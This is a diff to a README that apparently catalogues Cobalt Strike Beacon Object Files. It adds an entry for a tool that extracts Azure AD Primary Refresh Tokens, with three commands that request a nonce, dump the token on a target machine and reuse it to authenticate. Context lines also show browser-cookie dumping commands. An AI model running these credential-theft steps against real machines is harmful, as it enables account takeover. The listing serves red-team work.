@@ -413,6 +413,14 @@ cookie-katz-find --> Find target browser processes supported
 cookie-katz [chrome|edge|webview] [pid] --> Dump browser Cookies using OpenProcess and ReadProcessMemory API
 ```
 
+- [**aad_prt_bof**](https://github.com/wotwot563/aad_prt_bof)<br />
+Extract Azure AD (AAD) Primary Refresh Token (PRT) from the machine.<br />
+Load the CNA and follow the instructions in the BOFs README, shown below:<br />
+
+1. Request a nonce using ROADrecon (on your own machine): `roadrecon auth --prt-init`
+2. Request a token on the target machine using the BOF: `aadprt [NONCE]`
+3. Use the token to authenticate in ROADrecon (or any other tool): `roadrecon auth --prt-cookie [TOKEN]`
+
 ---
 ### Miscellaneous
 - [**BOF Template**](https://github.com/Cobalt-Strike/bof_template)<br />
